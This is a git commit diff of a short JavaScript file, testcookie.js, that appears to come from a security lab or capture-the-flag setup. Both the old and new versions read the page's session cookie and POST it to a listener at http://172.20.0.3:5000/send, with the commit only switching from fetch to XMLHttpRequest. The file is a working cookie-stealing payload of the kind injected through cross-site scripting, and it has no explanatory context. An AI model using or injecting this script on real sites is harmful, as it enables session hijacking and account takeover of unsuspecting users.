26e4b8eb9ec02ca2d0ae63e390444cd3a17c7cfe
zer0p0int <81251950+zer0p0intvvv@users.noreply.github.com>
2024-05-06 16:11:09 +0800

    Update testcookie.js

--- testcookie.js
+++ testcookie.js
@@ -1,16 +1,13 @@
 var sessionid = document.cookie.split('=')[1]+".";
 
-fetch('http://172.20.0.3:5000/send', {
-  method: 'POST',
-  body: 'header=fdsafdsa&listener=admin123321&content='+sessionid,
-  headers: {
-    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
-    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
-    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
-    'Accept-Encoding': 'gzip, deflate',
-    'Content-Type': 'application/x-www-form-urlencoded',
+var xhr = new XMLHttpRequest();
+xhr.open('POST', 'http://172.20.0.3:5000/send');
+xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4 && xhr.status === 200) {
+    console.log(xhr.responseText);
   }
-})
-.then(response => response.text())
-.then(data => console.log(data))
-.catch(error => console.error(error));
+};
+
+xhr.send('header=fdsafdsa&listener=admintest&content='+sessionid);
